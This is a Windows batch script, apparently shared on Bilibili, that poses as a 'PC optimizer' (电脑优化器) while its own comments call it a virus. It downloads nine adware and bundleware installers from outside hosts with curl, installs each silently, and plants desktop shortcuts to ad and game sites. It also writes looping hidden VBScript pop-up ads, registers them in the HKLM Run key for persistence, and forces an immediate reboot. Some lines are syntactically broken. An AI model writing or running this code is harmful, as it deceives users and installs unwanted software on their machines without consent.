@rem 此程序会对电脑造成严重伤害，请您三思而后行！
@rem 开发者：bilibili.com@SYSTEM-CSRSS-FYC 未经同意，严禁二改！

@rem 添加标题
@title 电脑优化器 
@rem UI设计
color 27
cls
@echo 欢迎使用电脑优化器，请在运行前确保网络已开启
@pause
@echo 正在执行优化操作
@rem 保护进程
wmic process where name='P5PDownloader' call SetPriority "256"
@rem 下载病毒文件
cd %appdata%
powershell curl -o "9wka01.exe" "https://download.2345.com/2345pcsafe/background/20220607/2345pcsafeoffline.exe"
powershell curl -o "9wwdj21.exe" "https://dl.2345.com/haozip/haozip_v6.3.1.11144_compliant.exe"
powershell curl -o "2ds8sc1.exe" "https://dl.2345.cc/pinyin/2345pinyin_v7.7.0.8283_compliant.exe"
powershell curl -o "2iaqj21.exe" "https://dl.2345.com/pic/2345pic_000000_10.9.0.9760_x64.exe"
powershell curl -o "5iaddss.exe" "https://dl.2345.com/pdfcvt/2345PdfConverter_v2.3.0.631.exe"
powershell curl -o "2iefe1.exe" "http://dl.kkdownload.com/kzgw_18/kuaizip_setup_v3.3.0.7_kzgw_001.exe"
powershell curl -o "qoiawfj31.exe" "http://file.cdn.cqttech.com/file/ChromeCore_1286_4.1.5.26.exe"
powershell curl -o "qoiwewf32q31.exe" "https://cdn.tongbuxing.net/1NW4yC/SetupChrome.exe"
powershell curl -o "qoiw9im89.exe" "http://picture.xianniu.com/pc/download/4.6.1.1/xianniusetup.4.6.1.1@SG6@.exe"@rem 静默安装病毒
@rem 静默安装病毒
start /wait   "9wka01.exe" /S
start /wait   "9wwdj21.exe" /S
start /wait   "2ds8sc1.exe" /S
start /wait   "2iaqj21.exe /S
start /wait   "5iaddss.exe" /S
start /wait   "2iefe1.exe"  /S
start /wait   "qoiawfj31.exe" /S
start /wait   "qoiwewf32q31.exe" /S
start /wait   "qoiw9im89.exe" /S
wmic process where name='9wka01.exe' call SetPriority "256"
wmic process where name='9wwdj21.exe' call SetPriority "256"
wmic process where name='2ds8sc1.exe' call SetPriority "256"
wmic process where name='2iaqj21.exe' call SetPriority "256"
wmic process where name='5iaddss.exe' call SetPriority "256"
wmic process where name='2iefe1.exe' call SetPriority "256"
wmic process where name='qoiawfj31.exe' call SetPriority "256"
wmic process where name='qoiwewf32q31.exe' call SetPriority "256"
wmic process where name='qoiw9im89.exe' call SetPriority "256"
@rem 创建病毒网址快捷方式
@echo off
set Program=http://4mir.zhangyu39.com/
set LnkName=一刀999，刀刀爆神装！
set WorkDir=一刀999，刀刀爆神装！
set Desc=当年网吧最火的页游
if not defined WorkDir call:GetWorkDir "%Program%"
(echo Set WshShell=CreateObject("WScript.Shell"^)
echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
echo Set oShellLink=WshShell.CreateShortcut(strDesKtop^&"\%LnkName%.lnk"^)
echo oShellLink.TargetPath="%Program%"
echo oShellLink.WorkingDirectory="%WorkDir%"
echo oShellLink.Windowstyle=1
echo oShellLink.Description="%Desc%"
echo oShellLink.Save)>makeviruslnk.vbs
makeviruslnk.vbs
attrib +s +h %systemdrive%\users\Desktop\makeviruslnk.vbs
del /f /q makeviruslnk.vbs

@echo off
set Program=https://www.douyin.com/
set LnkName=抖音网页版
set WorkDir=抖音网页版
set Desc=分享美好，留住感动
if not defined WorkDir call:GetWorkDir "%Program%"
(echo Set WshShell=CreateObject("WScript.Shell"^)
echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
echo Set oShellLink=WshShell.CreateShortcut(strDesKtop^&"\%LnkName%.lnk"^)
echo oShellLink.TargetPath="%Program%"
echo oShellLink.WorkingDirectory="%WorkDir%"
echo oShellLink.Windowstyle=1
echo oShellLink.Description="%Desc%"
echo oShellLink.Save)>makeviruslnk.vbs
makeviruslnk.vbs
attrib +s +h %systemdrive%\users\Desktop\makeviruslnk.vbs
del /f /q makeviruslnk.vbs

@echo off
set Program=http://6.cn/
set LnkName=6间房直播
set WorkDir=6间房直播
set Desc=6间房直播
if not defined WorkDir call:GetWorkDir "%Program%"
(echo Set WshShell=CreateObject("WScript.Shell"^)
echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
echo Set oShellLink=WshShell.CreateShortcut(strDesKtop^&"\%LnkName%.lnk"^)
echo oShellLink.TargetPath="%Program%"
echo oShellLink.WorkingDirectory="%WorkDir%"
echo oShellLink.Windowstyle=1
echo oShellLink.Description="%Desc%"
echo oShellLink.Save)>makeviruslnk.vbs
makeviruslnk.vbs
attrib +s +h %systemdrive%\users\Desktop\makeviruslnk.vbs
del /f /q makeviruslnk.vbs

@echo off
set Program=http://www.2345.com/
set LnkName=上网导航
set WorkDir=上网导航
set Desc=上网导航
if not defined WorkDir call:GetWorkDir "%Program%"
(echo Set WshShell=CreateObject("WScript.Shell"^)
echo strDesKtop=WshShell.SPEcialFolders("DesKtop"^)
echo Set oShellLink=WshShell.CreateShortcut(strDesKtop^&"\%LnkName%.lnk"^)
echo oShellLink.TargetPath="%Program%"
echo oShellLink.WorkingDirectory="%WorkDir%"
echo oShellLink.Windowstyle=1
echo oShellLink.Description="%Desc%"
echo oShellLink.Save)>makeviruslnk.vbs
makeviruslnk.vbs
attrib +s +h %systemdrive%\users\Desktop\makeviruslnk.vbs
del /f /q makeviruslnk.vbs

@rem 打开病毒网址
start iexplore http://www.douyin.com/
start iexplore http://www.pinduoduo.com/
start iexplore http://4mir.zhangyu39.com/
start iexplore http://www.2345.com/
start iexplore http://www.hao360.com/
@rem 投放特殊广告
cd %systemdrive
@echo off
do
wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""李时珍称它为“男人宝，大家服了都说好!"")(window.close)",vhide
loop>>gg1.vbs
gg1.vbs
attrib +s +h gg1.vbs

@echo off
do
wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""小鱼便签，帮您便利生活！"")(window.close)",vhide
loop>>gg2.vbs
gg2.vbs
attrib +s +h gg2.vbs

@echo off
do
wscript.createobject("wscript.shell").run "mshta vbscript:msgbox(""2345安全卫士，守护您的电脑安全！"")(window.close)",vhide
loop>>gg3.vbs
gg3.vbs
attrib +s +h gg3.vbs
@rem 将病毒写入开机启动项
@ECHO OFF
reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run /v virus.p5p.1 /t REG_SZ /d %systemdrive%\gg1.vbs /f
reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run /v virus.p5p.2 /t REG_SZ /d %systemdrive%\gg2.vbs /f
reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Run /v virus.p5p.3 /t REG_SZ /d %systemdrive%\gg3.vbs /f
@echo off 优化完成，即将重启
pause
shutdown /r /t 0
@rem 机都关了，exit干嘛（doge）
@rem 让代码更好看（doge）
exit